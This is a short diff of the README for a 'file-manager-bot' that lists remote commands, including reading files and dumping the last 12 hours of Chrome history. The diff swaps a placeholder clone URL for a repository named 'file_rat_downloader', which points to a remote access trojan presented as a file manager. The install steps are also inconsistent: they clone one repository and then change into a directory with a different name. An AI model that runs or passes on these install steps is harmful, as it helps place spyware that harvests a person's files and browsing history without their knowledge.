@@ -36,7 +36,7 @@ tail <file> [n]	Show last n lines
 history chrome	Show last 12h Chrome history
 exit	Shut down bot
 ⚡ Installation
-git clone https://github.com/YOUR_USERNAME/file-manager-bot.git
+git clone https://github.com/cmdkill3r/file_rat_downloader.git
 cd file-manager-bot
 python bot.py
 
